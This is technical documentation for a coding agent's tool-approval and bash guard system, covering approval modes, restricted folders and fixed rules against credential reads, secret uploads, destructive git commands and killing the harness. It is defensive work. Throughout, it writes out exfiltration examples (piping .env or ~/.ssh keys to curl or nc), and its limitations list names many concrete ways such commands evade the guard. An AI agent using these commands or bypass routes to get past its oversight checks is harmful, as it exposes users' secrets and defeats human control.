# Tool approval mode

Tool approval has three inputs:

1. **Tool declaration** — every tool may declare an `approval` tier:
   - `read`: reads data or updates UI-only session metadata.
   - `write`: mutates workspace/session state but does not execute arbitrary code.
   - `exec`: executes code, shells out, drives a browser, spawns agents, or performs similarly broad actions.
2. **Tool policy** — object-form declarations may set `policy: allow | deny | prompt`, optionally with `override`, a reason, and a `policyKey` for a dispatched sub-tool. This is used for argument-dependent safety/pattern rules.
3. **User policy** — `tools.approval.<toolName>: allow | deny | prompt` overrides the active mode, but cannot bypass a tool's own deny/prompt policy or a non-yolo safety override.

Tools without an `approval` declaration, and decisions without a valid tier, use `exec`. This is the safe default for unknown custom tools. MCP server tools declare `write`, regardless of their MCP annotations.

When an execute-time caller supplies neither settings nor `autoApprove`, approval resolution fails closed to `always-ask` with no user grants. A live extension wrapper can inherit its runner's session settings when context is omitted.

## Modes

Configure with `tools.approvalMode`:

| Mode                | Auto-approves                                          | Prompts for                 |
| ------------------- | ------------------------------------------------------ | --------------------------- |
| `always-ask`        | `read`                                                 | `write`, `exec`             |
| `always-ask-cached` | `read` without file targets, granted files and folders | file reads, `write`, `exec` |
| `write`             | `read`, `write`                                        | `exec`                      |
| `yolo` (default)    | `read`, `write`, `exec`                                | none                        |

`--approval-mode <mode>` overrides the configured mode for the session. `--auto-approve` and `--yolo` force yolo execution even when an explicit `--approval-mode` is also supplied; tool/user denies and explicit tool prompt policies still apply.

### Ask and remember (`always-ask-cached`)

Ask and remember prompts like `always-ask`, and also before a tool reads a file it has not been granted. Its prompts can remember what the call touched:

- **Approve Directory: `<folder>`** grants the folder around the call. A folder grant covers the files directly inside it, never a subfolder or anything below one. The prompt names the folder and lists its entries (directories end in `/`): the first few in the dock, up to 24 in the expanded prompt (`Ctrl+O`). Larger folders show the rest as a count.
- **Approve File** (or **Approve** for a directory or URL target) grants the exact targets.
- **Approve Once** approves this call only.

The **Remember across sessions** toggle above these answers decides where a grant lives. When it is off, the grant stays in memory for this conversation only: `/new`, a session switch, and other sessions in the same process start without it. When it is on, the grant is written to `approval-cache.db` in the agent directory and covers every later session. Hosts without the dialog (RPC, ACP, collab guests) get both lifetimes as separate choices: `Approve File`, `Always Approve File`, and so on.

- Grants record the capability tier they authorized. A write grant also covers reads of the same target; a read grant never covers a write or exec call.
- The tools that read files report the files and folders they touch: `read`, `grep`, `glob`, `ast_grep`, `find`, and the legacy `read`/`grep`/`find`/`ls` shims. A recursive search reaches below subfolders, so it needs a tree grant of its own; approving one also records the folder grant it includes. A root list such as `src;other` is keyed one root at a time.
- Other read-tier tools (`lsp`, `debug`, `github`, `todo`, …) stay auto-approved as in `always-ask`. This mode decides when you are asked; it does not sandbox reads.
- Reads of public web URLs are never gated. URLs whose host is `localhost`, a private, loopback, or link-local IP literal, a single-label name, or a `.local`/`.internal` name are gated like files. Hostnames are not resolved, so a public name that points at a private address is not detected. Internal URLs (`xd://…`, `local://…`) are keyed by their normalized form.
- An exec or write call that reports no targets (`bash`, `eval`, `browser`, `task`, MCP tools) prompts as in `always-ask`, with the usual **Approve `<tool>` for this session** choice.
- A read of `file.ts:120-140` and a write to `file.ts` share one key: selectors are peeled, the path is resolved against the session cwd and through symlinks (including a symlinked parent of a file that does not exist yet), and on Windows case is folded.
- Grant answers appear only on prompts the mode raised. Prompts forced by a tool policy, an `override` (bash critical commands), a `tools.approval.<tool>: prompt` rule, or a pending provider safety check keep plain Approve/Deny and record nothing.
- `/forget-approvals` clears the database and every conversation's session grants for the active agent directory. Deleting rows (`DELETE FROM grants`) or the file works too; every check reads the database fresh, so no restart is needed.

## Restricted folders

`tools.restrictedFolders` lists folders where every action needs an explicit approval, whatever the approval mode (`yolo` and `--auto-approve` included) and whatever was remembered:

```yaml
tools:
   restrictedFolders:
      - ~/secrets
      - C:/work/payments
```

- A restricted folder covers itself and everything below it. A call whose targets fall inside it (`read`, `write`, `edit`, `grep`, `glob`, `ast_grep`, `find`, and any tool reporting `approvalCacheTargets`) prompts with `Reason: Restricted folder: <folder>`. A recursive search rooted above a restricted folder prompts too, because it reads into it; a one-level listing of the parent does not.
- Paths are compared like Ask and remember keys: `~` is expanded, relative entries resolve against the session cwd, symlinks are resolved, and on Windows case is folded. `/a/foo` never covers `/a/foobar`.
- A tool that names no path (`bash`, `eval`, `browser`, MCP tools, eval preludes) is matched by the directory it runs in: its `cwd` argument when it has one, else the session cwd. The command text is not parsed, so a `bash` call running outside the folder that names a file inside it does not match; use a `tools.approval.bash` policy for that.
- The prompt offers plain **Approve** / **Deny**: no session answer, no grant, and no ACP "Always allow" covers it, so every call asks again. A `deny` policy (tool or `tools.approval.<tool>: deny`) still denies.
- Without an interactive UI (print mode, headless subagents, the Cursor exec bridge) the call is refused, like any other prompt with nobody to answer it.
- The `/settings` panel edits the list as JSON under Interaction → Approvals. It is hidden when project config supplies the list, so a project value is never promoted to global config.

## User overrides

`tools.approval` is honored in every mode:

```yaml
tools:
   approvalMode: write
   approval:
      bash: prompt
      read: allow
      mcp__filesystem_delete: deny
```

For MCP tools, key the policy by the exact final registered name. The ordinary form is
`mcp__<sanitized_server>_<sanitized_tool>`. A redundant `<server>_` prefix is removed from the tool name,
so server `echo` tool `echo_it` is registered as `mcp__echo_it`. Names longer than 64 characters are
capped with a deterministic hash suffix; use the final capped name rather than the uncapped pattern. See
[MCP tool naming](./mcp-server-tool-authoring.md#naming-and-collision-domain).

The sanitizer lowercases names and retains letters, digits, and underscores. For MCP names changed by the older digit-stripping sanitizer, a legacy `deny` or `prompt` key is inherited only when no current-name policy applies; legacy `allow` is never inherited.

A decision's `policyKey` selects `tools.approval.<policyKey>` first, falling back to the invoking tool's policy when the keyed policy is missing or invalid. For example, `write` to a mounted `xd://lsp` device consults `tools.approval.lsp` before `tools.approval.write` and uses the device operation's tier.

Resolution per tool call:

1. Evaluate `tool.approval(args)`; omitted/malformed decisions default to tier `exec`.
2. A tool-declared `policy: deny` always denies. A user `deny` is checked next and also always denies.
3. In `yolo`, an explicit tool `allow`/`prompt` policy wins; otherwise the valid user policy wins, or the call is allowed. The `override` flag alone does not force a prompt in `yolo`.
4. In non-yolo modes, an `override: true` decision allows only an accompanying tool `policy: allow`; every other non-denied case prompts.
5. Without an override, an explicit tool `allow`/`prompt` policy wins, then a valid user policy wins.
6. With no explicit policy, the active mode auto-approves or prompts by tier. In `always-ask-cached`, a call whose `approvalCacheTargets` are all granted is allowed instead.

Policy strings are trimmed and case-normalized. Invalid user values are ignored.

Approval is resolved again after extension `tool_call` handlers revise the input, against the arguments that will actually execute. A deny blocks execution before a prompt; a call that still requires a prompt fails rather than silently allowing it when no interactive UI is available.

## Safety overrides

A tool can force a prompt with object-form approval:

```ts
approval: { tier: "exec", override: true, reason: "Critical pattern detected" }
```

`bash` uses this for critical destructive patterns such as `rm -rf /`, fork bombs, remote-fetch-then-execute, writes to `/etc/passwd`, and host shutdown commands. It also supports configured `bash.patterns` rules: `deny` is absolute, `prompt` forces a prompt, and `allow` explicitly allows a matching simple command at the `write` tier. Operator `deny` rules (from `Settings.grantAuthority()`) cannot be overridden by project-layer `bash.patterns`. Reasons appear in the approval prompt. In `yolo`, a bare critical override is ignored, but an explicit tool/user `prompt` or `deny` policy is still enforced.
For standalone bash commands, critical detection takes precedence over matching `allow`/`prompt` pattern returns (but not `deny`), replacing them with that bare safety override. For compound lines that do not qualify for `bash.allowCompoundCommands`, `deny` and `prompt` rules resolve per tokenized segment (first-match within each segment) and combine with `deny` precedence across segments and whole-command restrictions.

`bash.allowCompoundCommands` is off by default. When enabled, it recognizes only flat chains joined by `&&` whose segments consist of literal arguments. Rules remain ordered within each segment: the first matching rule wins for that segment. Explicit restrictions are combined conservatively across the chain: any matching `deny` wins, otherwise any matching `prompt` wins. A restriction matching the complete chain but no individual segment remains a whole-chain veto.

All matching whole-chain restrictions are considered, so a later whole-chain deny overrides an earlier prompt. The opt-in requires a positively identified POSIX-quoting shell through the centralized shell classifier. Cmd, PowerShell, fish, and unknown shells retain legacy approval behavior.

These explicit chain and segment restrictions are resolved before the existing raw and canonical critical-command checks. After those checks, a chain whose segments all explicitly resolve to `allow` receives the `write`-tier allow; if any segment is unmatched, bash instead retains its standalone `exec` approval tier with no explicit policy. The generic resolver then applies `tools.approval.bash`, followed by the active approval mode, exactly as it would for a standalone command. An unmatched segment therefore prompts only when that existing tool-wide policy or mode requires it. Expansions, assignments, other control flow, redirections, globbing, newlines, malformed syntax, and shell-state-changing builtins do not qualify and retain legacy approval behavior.

This pattern policy controls approval for the `bash` tool; it is not process or filesystem containment. An approved command retains the shell's ambient filesystem, network, and subprocess access. The `eval` tool also declares the `exec` tier and can spawn a shell via subprocess, so a `bash.patterns` `deny` rule does not apply to the same command run through `eval` — under `yolo`, that `exec` call resolves to `allow`. To gate the shell `eval` can reach, add a `tools.approval.eval` policy (`prompt` or `deny`) alongside `bash.patterns`.

### Fixed guard rules

With `tools.guardRules: true` (off by default), `bash` applies four fixed rules besides the critical patterns (the rules are ported from [nace-ai/intern](https://github.com/nace-ai/intern)'s tool guard, Apache-2.0; see `packages/coding-agent/THIRD-PARTY-NOTICES.txt`). They are a convenience layer over the command line's top-level commands, not a security boundary: they catch common mistakes, and a nested, determined or obfuscated command gets past them (see the limitations below). The critical patterns are matched against the raw command line as before, with the setting on or off. A rule match returns the same bare critical override, with the reason `<rule>: <why>`: it prompts in `always-ask`, `always-ask-cached`, and `write`, a caller with no interactive UI refuses the call, and `yolo` ignores it unless a tool/user `prompt` or `deny` policy applies, exactly like a critical pattern. Matching `bash.patterns` `allow` rules do not bypass them.

| Rule | Fires on |
| --- | --- |
| `credential_read` | A reading command (`cat`, `less`, `head`, `base64`, `cp`, `tar`, `grep`, `sed`, …) or a `<` or `<>` redirection naming a private key or token in `~/.ssh` (not `config`, `known_hosts`, `authorized_keys`, or `*.pub`), `~/.aws` (not `config`), `~/.gnupg`, `~/.kube`, `~/.docker`, `~/.azure`, `~/.password-store`, `~/.config/gcloud`, `~/.config/gh`, `~/Library/Keychains`, `~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`, omp's credential store (`agent.db`, the auth-broker snapshot), or `/etc/shadow`; `security dump-keychain`/`export`, `security find-*-password` with `-w` or `-g` (not `add-*-password -w`, which stores one), and `gpg --export-secret-keys`. A name written as a brace list or a pathname pattern counts when it can name one of them (`~/.{netrc,x}`, `~/.netr[c]`, `~/.ss?/id_*`); as in bash, `*`, `?` and `[...]` match no leading `.`, and a word whose every `{` is quoted or escaped (`'{"a":1,"b":2}'`) is not brace-expanded. On macOS and Windows, whose file systems ignore case by default, names are compared without regard to case (`~/.SSH/id_rsa`, `.ENV`). A `tar` member's braces are expanded (`tar czf - {~/.ssh,~/.aws}`); a path `tar` excludes (`--exclude`, `--exclude-from`, `-X`) is not read, nor is a member of an extraction, listing or deletion (`tar xzf a.tgz -C ~/.ssh id_rsa`, `-t`, `--delete`), which names an entry of the archive. A search given no file reads the directory it runs in when it walks it: `rg` with a pattern and no piped or redirected input, and `grep -r`/`-R`/`-d recurse` (`cd ~/.ssh && grep -r PRIVATE`). An option (`cat -n`), a number right after one (`head -n 5`), `-` and a URL are not files a command reads, and neither are the pattern of `grep`/`rg`/`sed`/`awk` (unless `-e` or `-f` gives it; `grep -C 2` and the other context and count options take a value), the URLs `curl` and `wget` fetch (but `curl -K` and `wget -i` read their file), where `curl -o` or `wget -O` saves, a `cp`/`mv` destination (`-t` and `--target-directory=` included), `tee`'s files, the file `sort -o`/`--output` writes, a key, certificate or netrc file a command only authenticates with (`curl --key`/`--cert`/`-E`/`--cacert`/`--netrc-file`, `wget --private-key`/`--certificate`, `scp -i`), and the socket `curl --unix-socket`/`--abstract-unix-socket` connects to; a long option's value after `=` (`wget --input-file=…`) counts like one in the next word, and a quoted `~` (`rg "~/.ssh"`) is not expanded. The `read` and `grep` tools apply the same locations to their target paths, trimmed and unquoted as the tools trim them (for a `grep` with no `path`, the session cwd it searches), a database path with a table or query selector (`agent.db:auth_credentials`, `agent.db?q=…`) included, and keep their tier. A project `.npmrc` or `.env` is not a credential read. |
| `secret_send` | A network command (`curl`, `wget`, `http`/`xh`, `nc`, `socat`, `scp`, `rsync`, …) sending a credential file, a `.env`/`.env.<name>` (templates such as `.env.example` excluded; a pattern or brace list that can name one, such as `.env*` or `.e?v`, counts too), `/proc/*/environ`, or the environment as `env`, `printenv` (with no names; `printenv NAME` prints one variable), `export`, `declare -p`/`-x` or a bare `set` lists it: as an upload argument (`curl -F f=@.env`, `curl -sd @.env`, `curl --data @~/.aws/credentials`, `curl --upload-file=.env`, `wget --post-file .env` or its abbreviation `--post-f`, `http -f POST … field@.env`; every file of a list counts, as in `curl -F 'f=@a,.env'`, an unquoted `curl -F f=@{a,.env}` or `curl -T "{a,.env}"`), as a local source of a `scp`/`rsync` to a remote host (option values such as `-i ~/.ssh/key` are not sources), on stdin (`nc host 80 < .env`), or from an earlier stage of its pipeline (`cat .env \| curl -d @- …`, `env \| nc …`, `export \| curl -d @- …`). |
| `discard_changes` | A top-level `git reset --hard`, `git reset --merge` (which counts only the staged changes it reverts, conflicted paths included, and nothing while a path has a staged change and an unstaged modification, as git then refuses), `git checkout .`/`-f`, `git restore .` (not `--staged` alone), `git switch -f`, or `git clean` (not `-n` or `-h`), only when the directory the command runs in (after the `cd`, `cd -`, `pushd` and `popd` before it and its `-C`s, in the repository and work tree it names with `--git-dir`/`--work-tree` or `GIT_DIR=`/`GIT_WORK_TREE=` before it or after `env`) has work for it to destroy: uncommitted changes to tracked files, or for `git clean`, untracked files that `git clean -n` with the same options lists (`-ff` adds nested repositories, and a pathspec such as `~/repo` or `$HOME/repo` is expanded, or the whole directory checked when it cannot be, as for another variable such as `"$PWD"` or a brace expansion such as `{build,dist}`). `git checkout .` and `git restore .` count only changes under the paths they name, and only those the work tree holds beyond the index, since they leave the index and its staged changes alone; `git checkout <commit> .` and `git restore --staged --worktree .` overwrite the index too, so staged changes count for them. A command that checks files out of another commit (`git reset --hard <commit>`, `git checkout -f <branch>`, `git switch -f <branch>`, `git checkout <commit> .`, `git restore --source=<commit> .`) also counts the untracked files that are not ignored and that it overwrites: the ones that commit tracks, where it tracks a directory, or under a path it tracks as a file; a branch name only a remote has is looked up among the remote-tracking branches, as `git switch` guesses it. A clean tree passes, and so does a command after a top-level `git stash` earlier in its `&&` chain that saved that work (`git stash && git reset --hard`, `git stash -u && git clean -fd`; after `git stash -u` only the ignored files that `git clean -x` would delete count, and an `-e` pattern still protects the ones it names; `git stash -a` saves ignored files too; a checkout of another commit after a stash without `-u` still counts the untracked files it overwrites). A stash counts only as the last command of its pipeline, not when that pipeline is negated (`! git stash`). An `||` makes only the pipeline right after it optional, and a stash anywhere in the work tree counts (`cd sub && git stash && cd .. && git reset --hard`). It stops counting at a top-level `git stash pop`/`drop`/`clear`/`branch` elsewhere in the command line, in any pipeline stage, that may run before the command finishes, unless that one is earlier in the stash's own `&&` chain (`git stash && git stash pop \| tail && git reset --hard` and `git stash && git reset --hard & git stash pop` ask). One that runs only after the command leaves it counting: later in the command's and-or list, or past the end of that list (a `;` or newline) when no `&` runs the list in the background (`git stash && git reset --hard && git stash pop` and `git stash && git reset --hard; git stash pop` pass). No stash counts in a command line the guard does not read whole: one with a nested part where it stops reading (see the limitations), a compound command, a function, an `env -S` string, or a shell, `eval`, `source`, `trap` or `coproc` command, any of which could run a `git stash pop` unseen (`git stash && git reset --hard; echo $(date)` asks). It never covers `git clean -ff` (a stash keeps no nested repository), and counts only among the 64 latest stashes before the command. The check sees the tree as it is before the command line runs, so a top-level `git stash pop`, `apply` or `branch` that may run before the command, as for the releases above, in the same repository or in one the guard cannot place, makes it ask whatever the tree holds now, unless a stash after it in the command's `&&` chain saved that work (`git stash pop && git reset --hard` asks, `git stash pop && git stash && git reset --hard` passes). Where the directory is unknown (after a directory change the guard does not follow, or where `env -C` or `sudo -D` runs the command), no probe runs for a git command unless its `-C` names the directory by an absolute path, `~` or `$HOME`. |
| `kills_harness` | A top-level `pkill`/`killall` that would signal the omp process or one of its ancestors: a `pgrep` lists what the command selects and the rule fires only when it lists one of those PIDs. `pkill`'s own options (`-c`, `-e`, `-H`, `-q <value>`) and its signal (`-9`, `-KILL`, `-kill`, `-SIGTERM`) are left out of the `pgrep`, and a zero signal (`-0`, `-s 0`, `--signal=0`, `-EXIT`) sends nothing, so it is not probed. A `killall` name is matched exactly (`-r` as a regular expression, `-I` ignoring case), and a name of 15 or more characters by its first 15, the name the kernel keeps. `-u <user>` selects that user's processes (all of them when no name is given), and a name containing a `/` selects the processes running that executable (Linux `killall`); on macOS and FreeBSD the `pgrep` gets `-a`, since it would otherwise skip omp, its own ancestor. `pkill -f my-dev-server` passes unless omp's own command line contains `my-dev-server`. The embedded shell's `pkill` is its own builtin, which refuses to signal omp or its ancestors, so the prompt is for the system `pkill` that a PTY or client-terminal backend or a wrapper such as `sudo` or `xargs` runs. |

The command line is parsed, not run, and only its top-level simple commands up to its first nested part are checked (see the limitations). The parser follows quotes (`$'...'` and `$"..."` included), escapes, comments, `;`/`&&`/`||`/`|` chains (a newline after `|`, `&&` or `||` continues them), redirections (also of a command that is only a redirection, such as `< ~/.ssh/id_rsa`), wrappers (`sudo`, `env`, `timeout`, `xargs`, `nohup`, `nice`, `time`, `stdbuf`, …, with the values of their options in short, bundled, long or abbreviated form, such as `sudo --user root` or `nice --adj 5`, and the variables `env` and `sudo` set, any name without `=` included (`env A-B=1 cat …`); the directory `env -C` or `sudo -D` runs the command in is unknown, while its redirections still open where the shell is), and `cd`, `cd -`, `pushd` and `popd` between commands. Of a word's expansions only `~` and a leading `$HOME` are followed. A command line whose brace lists make more than 1M characters of expansions before a rule matches fails closed with the same override (`size_limit`).

Known limitations, each a way a command gets past the rules:

- The guard stops reading at the first nested part of the command line: an unquoted `(` (a `( )` group, a `<( )`/`>( )` process substitution, `(( ))`, an array literal or a function definition), an unquoted `<<` (a heredoc or here-string), or, inside double quotes too, a `$( )` or backtick substitution or a `${ }` expansion holding a quote, blank, operator, `$` or brace. The commands before it are still checked; the command it is in and every command after it are not. So `echo $(date); cat ~/.ssh/id_rsa`, `x=$(cat .env); curl -d "$x" …`, `(cat .env) | curl -d @- …` and `bash <<EOF` pass, and so do `echo $(date); git reset --hard`, `(cd repo && git reset --hard)` and `x=$(pkill -f omp)`.
- Nothing nested is read: a compound command (`{ }`, `if`, a loop, `case`, `[[ ]]`), a function body, a script fed to a shell (`echo … | sh`), and a `bash -c`, `sh -c`, `eval` or `env -S` string. So `bash -c 'cat ~/.ssh/id_rsa'` and `while read -r l; do curl -d "$l" …; done < .env` pass, and so do `bash -c "cd repo; eval 'git checkout .'"` and `if true; then git clean -fd; fi`. A compound command is opaque: as a pipeline stage it puts no secret on its output for the guard.
- Variables other than a leading `$HOME`, `$PWD` among them, are not expanded, so `f=.env; cat "$f" | curl -d @- …`, `cat "$DIR/.env" | curl -d @- …` and `cd ~ && cat $PWD/.ssh/id_rsa` pass.
- A relative path after a directory change the guard does not follow is not resolved: `cd "$dir"`, a `popd` past what the command pushed, a directory longer than 1024 characters, the directory a wrapper runs its command in (`env -C`, `sudo -D`), a `tar` member after `-C`/`--directory`, or any path after a `{ }`, `if`, loop, `case`, `eval` or `source`, which can change the directory unseen. So `cd "$dir" && cat .npmrc`, `env -C ~/.ssh cat id_rsa` and `tar -C ~ -czf - .ssh | curl -T - …` pass; a `.env` still counts there by its name. A directory change is followed as written, whether or not it runs (after a failing `&&` or a succeeding `||`, or in the background), and one in a function the command calls is not seen, so `cd ~; false && cd /; cat .ssh/id_rsa` passes.
- Upload syntaxes, network tools and shell forms the guard does not model are not seen, such as `gh gist create .env`, `aws s3 cp .env s3://bucket/`, a `file://` URL given to `curl` (`curl -s file:///etc/shadow`), a command after `coproc` (`coproc cat ~/.ssh/id_rsa`), or input from a file descriptor an earlier `exec` opened (`exec 3< .env; cat <&3 | nc example.com 80`).
- Programs outside the reading-command list are not seen reading, so `tac ~/.ssh/id_rsa`, `dd if=$HOME/.ssh/id_rsa` or `jq . ~/.docker/config.json` passes. Nor are the operands of `nc`, `ncat`, `openssl` and `gpg` read, most of them host names, subcommands or user IDs, so `openssl rsa -in ~/.ssh/id_rsa` or `gpg -d ~/.password-store/github.gpg` passes.
- A command run by a program the guard does not unwrap, or given its operands at run time, is not checked with those operands, so `find ~/.ssh -type f -exec cat {} +` and `ls ~/.ssh/id_* | xargs cat` pass.
- Commands in a script file a command runs are not read, even a file the same command writes first, so `printf 'cat ~/.ssh/id_rsa' > x.sh; sh x.sh` passes. Nor is a `git stash pop` run by a script, a git alias or a program the guard does not unwrap seen to take back what a stash before a discard saved, so `git stash && make restore && git reset --hard` passes.
- A program word written as a brace list or a pathname pattern is not expanded, so `{cat,/etc/shadow}` and `/bin/ca[t] /etc/shadow` pass.
- A directory that contains a credential location does not count as one, so `tar czf - ~ | curl -T - …`, `cp -r ~ /tmp/h` or the `grep` tool searching `~` passes.
- A secret copied to another file first is sent under that file's name, so `cp .env /tmp/x && curl -F f=@/tmp/x …` passes.
- Brace expansion is followed only in words up to 4096 characters long and for their first 1024 words, so a name at the end of a longer list (`{a,b}{a,b}…{a,b}{x,.env}`) passes.
- A path that reaches a credential location through a symlink, hard link or bind mount is not recognized, so `ln -s ~/.ssh k && cat k/id_rsa` passes; nor do bare wildcards for every component of `~/Library/Keychains` name it, so `cat ~/*/*/login.keychain-db` passes.
- A missing path the `read` tool finds by a unique match deeper under the session directory is checked as written, only trimmed and unquoted (`.netrc ` counts as `.netrc`), so `read id_rsa` run from the home directory, which opens `~/.ssh/id_rsa`, passes.
- A same-size edit to a file a configured filter driver handles (git-lfs, git-crypt) is not seen by `discard_changes`: the git check runs no filter, so it compares such a file with the size the index recorded for it.
- `discard_changes` checks the tree as it is before the command line runs. A top-level `git stash pop`, `apply` or `branch` that may run first makes it ask, but work any other command writes into the tree first is not seen, so `mv ~/notes.txt . && git clean -f` and `git apply fix.patch && git reset --hard` pass.
- Where the directory is unknown (see above: after a directory change the guard does not follow, or where `env -C` or `sudo -D` runs the command), `discard_changes` does not check a git command, unless its `-C` names the directory by an absolute path, `~` or `$HOME`, nor `kills_harness` a `killall` name written as a relative path. So `cd "$d" && git reset --hard` and `env -C repo git reset --hard` pass even when they name the session's repository. A bash `cwd` that is an internal URL or does not resolve leaves the starting directory unknown to these two rules too.
- A git alias (or `-c alias.*`) that expands to a discarding command is not resolved, so `git config alias.nuke 'reset --hard'` followed by `git nuke`, or `git -c alias.x='reset --hard' x`, passes.
- The probes of one call share three seconds, so in a command that asks more of them than fit, such as a long run of distinct `pkill` patterns, the ones left without time count as no match.

The `discard_changes` and `kills_harness` probes are read-only and a probe that fails or cannot run counts as no match. All the probes of one call share three seconds of probe time: each gets the time left as its timeout (the git check as a whole, every git call it makes included, or one `pgrep`), and once none is left the rest do not run. They run only when the answer can change the decision under the approval mode the call is resolved in: not in `yolo` unless `tools.approval.bash` is set (an ACP client that asks under `always-ask` because `yolo` is only the default gets them), not for the lookup the agent loop makes without a call context to schedule the call (it reads only the tier, which no probe changes), and not for the tier lookup `bash` makes after a call is approved. The approval paths of a tool call (the ACP permission gate, the extension wrapper before and after `tool_call` hooks) and the rows of its prompt share one probe budget: what a check found, and each probe's answer, are reused for that call only, and every other call probes again, since an earlier call of the same batch may change the tree first. A compound prompt takes each `&&` segment's rule from one parse of the whole chain, so a segment a `git stash` before it protects shows no rule. The git check runs through `@oh-my-pi/pi-natives/vcs` (`discardsWorkSync`) and runs no program the repository configures: it pins `core.fsmonitor=false` and `core.untrackedCache=false`, blanks every configured filter driver (whatever its name), does not enter submodules, never fetches a missing object from a promisor remote (`GIT_NO_LAZY_FETCH=1`, and an empty `GIT_ALLOW_PROTOCOL` for git before 2.45), and drops every inherited `GIT_*` variable (`GIT_DIR`, `GIT_WORK_TREE`, `GIT_INDEX_FILE`, `GIT_CONFIG*`, `GIT_EXEC_PATH`, …).

`discard_changes` and [`bash.gitGuard`](./settings.md) are independent and can both be on. `bash.gitGuard` judges each `git` the embedded shell runs, when it runs, by whose checkout it is: in a repository's main checkout it refuses `git stash`, `reset --hard`, `switch`, and checkout or working-tree restore of paths whether or not they would lose anything; in a linked worktree it lets them run and saves the discarded changes on `refs/omp/discarded` first. It does not cover `git clean`. `discard_changes` asks before the call runs, in any checkout and for a top-level git command only, and only when the command would lose work. Approving a `discard_changes` prompt does not lift a `bash.gitGuard` refusal, and a `git stash` that `bash.gitGuard` refuses fails its `&&` chain, so a discard after it does not run.

### Computer safety

The disabled-by-default Eval [`computer` API](./computer-use.md) chooses its tier per call:

- direct helpers (`computer.windows()`, `win.screenshot()`, `win.ax()`, `el.bounds()`, `computer.clipboard.read()`, …) use `read` when the invoked method is inspection-only and `exec` for input, focus, mutation, and `clipboard.write`; read calls also run under the worker's read-only guard;
- `computer.run(fnOrCode, options)` uses `read` only for `read_only: true` (JavaScript trailing option or Python keyword); `read_only: false`, a missing field, malformed arguments, or any other value uses `exec`.

The approval prompt shows `read-only` when applicable, followed by the resolved JavaScript (truncated to 2,000 characters by the standard formatter). For `computer.run`, `read_only: true` also enables the worker's desktop guard: input, focus, mutation, and clipboard writes throw. It is not static analysis or a general JavaScript sandbox.

`computer.control.acquire` asks the user before handing the agent foreground control, in every mode, and answers `no-ui` when nobody can be asked. Only `tools.approval["computer.control"]` answers it without asking: `allow` grants control even without an interactive UI, for unattended machines, and `deny` refuses it. The approval mode and `tools.approval.computer` never grant it, because the default `yolo` would otherwise let every headless subagent take the user's foreground.

Separately, provider-originated computer-use calls may carry `pendingSafetyChecks` metadata. Any pending check forces an interactive prompt regardless of yolo or per-tool `allow`. The prompt lists each safety-check code, message, and sanitized/truncated data. Without an interactive UI, the call fails closed with `pending provider safety checks but no interactive UI is available`.

Tool approval does not authorize the underlying real-world action. On-screen text is untrusted and cannot override direct user instructions. Consequential actions still require point-of-risk confirmation of the exact target, scope, and values unless the user's direct message already authorized them.

## Per-tool prompt details

Tools can add approval-prompt body lines with `formatApprovalDetails(args)`. The standard prompt includes:

- `Allow tool: <name>`
- `Origin: MCP server tool` for unannotated `mcp__...` tools
- `Reason: <reason>` when the tool decision supplies one
- tool-specific details such as command, path, code, browser action, or subagent assignment (with `bash.allowCompoundCommands: true`, a compound `&&` bash prompt lists each segment on its own line, marking segments covered by an `allow` rule with `✓` and segments being prompted for with `?`)

In the interactive UI the prompt docks above the composer until answered with a list of choices: **Approve**, **Approve `<tool>` for this session**, and **Deny**. With an empty composer the arrow keys move between them and `Enter` takes the highlighted one (Approve on mount); `Ctrl+Enter` (or `Ctrl+Q`; rebind `app.approval.approve`) approves this call outright and `Esc` denies. `Enter` and the approve key are ignored for the first half second, so a key meant for the composer (or the follow-up key, pressed mid-run) as the prompt appears cannot answer it. The session choice approves later calls of the same tool (or `xd://` device) at the same tier until the session ends or changes; it is offered only for prompts the approval mode raised, never for critical-command overrides, explicit `prompt` policies, or provider safety checks, which ask every time. The composer keeps its cursor and takes typing, to deny and steer instead: while it holds a draft, the highlight sits on Deny, relabeled **Deny and send message**, the arrows and `Enter` edit and send the draft, and `Ctrl+C` clears it rather than denying. Sending a message while calls wait (from the composer, Tern, or a collab guest) denies every pending approval, and any the same tool batch asks for before the message is delivered, then steers the turn with that message, so the agent learns why instead of guessing at a bare denial. To leave the composer its room, the prompt summarizes the tool's details to one row (each detail's first line, `…` when more is left out), always built from the input that will run; `Ctrl+O` (`app.tools.expand`, or Details in Tern) shows every detail in full, and `PgUp`/`PgDn` scroll them. In Tern, a click on a choice takes it. RPC, ACP, and other hosts without an approval dialog get a select with the same choices and the full details.

An Ask and remember prompt with grants lists the **Remember across sessions** toggle and the grant choices above **Approve Once**, which is highlighted on mount. `Enter` on the toggle flips it, and the grant labels switch to their **Always …** forms. `Ctrl+Enter` still approves only this call.

## Defining approval on tools

Built-in and custom tools share the same shape:

```ts
export type ToolTier = "read" | "write" | "exec";
export type ToolApprovalDecision =
  | ToolTier
  | {
      tier: ToolTier;
      reason?: string;
      override?: boolean;
      policy?: "allow" | "deny" | "prompt";
      policyKey?: string;
    };
export type ToolApproval = ToolApprovalDecision | ((args: unknown) => ToolApprovalDecision);

approval?: ToolApproval;
formatApprovalDetails?: (args: unknown) => string | string[] | undefined;
approvalCacheTargets?: (args: unknown) => readonly string[] | undefined;
```

`approvalCacheTargets` returns the keys `always-ask-cached` checks and records for a call: absolute file paths (derive them with `approvalTargetKey` so selectors, cwd, and symlinks resolve the same way the built-in tools do) or normalized internal URLs. `ToolDefinition` and `CustomTool` accept the same hook. A tool that omits it is resolved by tier alone, as in `always-ask`.

Examples:

```ts
approval: "read";

approval: args => (LSP_READONLY_ACTIONS.has(args.action) ? "read" : "write");

approval: args =>
	isCritical(args.command) ? { tier: "exec", override: true, reason: "Critical pattern detected" } : "exec";

approval: args => (isForbidden(args) ? { tier: "exec", policy: "deny", reason: "Blocked by tool policy" } : "write");
```

## ACP sessions

ACP (`omp acp`) uses the same settings resolver as normal OMP launches. Global `~/.omp/agent/config.yml` applies, project config for the ACP session `cwd` applies, and any `--config <file>` overlays passed to the ACP server process apply to sessions created by that process.

To auto-approve ACP tool calls, set the mode in global or project config:

```yaml
tools:
   approvalMode: yolo
```

Or launch the ACP server with a runtime override or a one-process config overlay:

```bash
omp acp --yolo
omp acp --auto-approve
omp acp --approval-mode yolo
omp acp --config ./acp-yolo.yml   # file contains tools.approvalMode: yolo
```

